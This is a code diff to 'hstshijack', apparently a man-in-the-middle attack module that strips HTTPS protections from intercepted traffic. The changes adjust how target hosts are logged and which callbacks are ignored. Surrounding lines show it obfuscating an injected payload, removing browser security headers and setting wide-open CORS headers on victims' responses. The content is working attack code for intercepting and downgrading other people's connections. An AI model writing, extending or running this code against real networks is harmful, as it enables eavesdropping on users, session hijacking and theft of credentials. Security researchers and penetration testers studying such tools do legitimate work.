@@ -98,6 +98,17 @@ function configure() {
 		regexp = new RegExp(obfuscation_variables[i], "ig")
 		payload = payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
 	}
+	// Make sure specific target hosts are in SSL log
+	for (var i = 0; i < target_hosts.length; i++) {
+		target = target_hosts[i]
+		if ( !target.match(/^\*/) ) {
+			if ( ssl_log.indexOf(target) == -1 ) {
+				ssl_log.push(target)
+				writeFile( env("hstshijack.log"), ssl_log.join("\n") )
+				env("hstshijack.log") ? log_debug("(" + green + "hstshijack" + reset + ") Saved " + target + " to SSL log.") : ""
+			}
+		}
+	}
 }
 
 function showModule() {
@@ -157,18 +168,25 @@ function onRequest(req, res) {
 	configure()
 	// Handle callbacks first
 	if ( req.Path == "/" + callback_path ) {
-		var callback_data = atob( req.Query )
+		var callback_data = atob(req.Query)
 		if ( callback_data.match(/^http(s|):\/\//i) ) {
 			log_debug("(" + green + "hstshijack" + reset + ") Received callback for " + callback_data + ".")
 			new_host = callback_data.replace(/http(s|):\/\//i, "").replace(/\/.*/, "")
 			new_path = "/" + callback_data.replace(/http(s|):\/\/.*?\//i, "")
-			if ( ssl_log.indexOf(new_host) == -1 ) {
-				log_debug("(" + green + "hstshijack" + reset + ") Learning HTTP response from " + callback_data + ".")
-				req.Hostname = new_host
-				req.Path     = new_path
-				req.Query    = ""
-				req.Body     = ""
-				req.Method   = "HEAD"
+			ignored = false
+			for (var i = 0; i < target_hosts.length; i++) {
+				regexp = wildcardToRegexp(target_hosts[i])
+				new_host.match(regexp) ? ignored = true : ""
+			}
+			if (!ignored) {
+				if ( ssl_log.indexOf(new_host) == -1 ) {
+					log_debug("(" + green + "hstshijack" + reset + ") Learning HTTP response from " + callback_data + " ...")
+					req.Hostname = new_host
+					req.Path     = new_path
+					req.Query    = ""
+					req.Body     = ""
+					req.Method   = "HEAD"
+				}
 			}
 		} else {
 			// Silent callback received
@@ -234,7 +252,7 @@ function onResponse(req, res) {
 		if ( ssl_log.indexOf(host) == -1 ) {
 			ssl_log.push(host)
 			writeFile( env("hstshijack.log"), ssl_log.join("\n") )
-			log_debug("(" + green + "hstshijack" + reset + ") Saved " + host + " to SSL log.")
+			env("hstshijack.log") ? log_debug("(" + green + "hstshijack" + reset + ") Saved " + host + " to SSL log.") : ""
 		}
 	}
 	// Hijack this response if required
@@ -344,7 +362,7 @@ function onResponse(req, res) {
 		res.RemoveHeader("X-Permitted-Cross-Domain-Policies")
 		res.RemoveHeader("X-XSS-Protection")
 		res.RemoveHeader("Expect-Ct")
-		// set insecure headers
+		// Set insecure headers
 		res.SetHeader("Allow-Access-From-Same-Origin", "*")
 		res.SetHeader("Access-Control-Allow-Origin", "*")
 		res.SetHeader("Access-Control-Allow-Methods", "*")
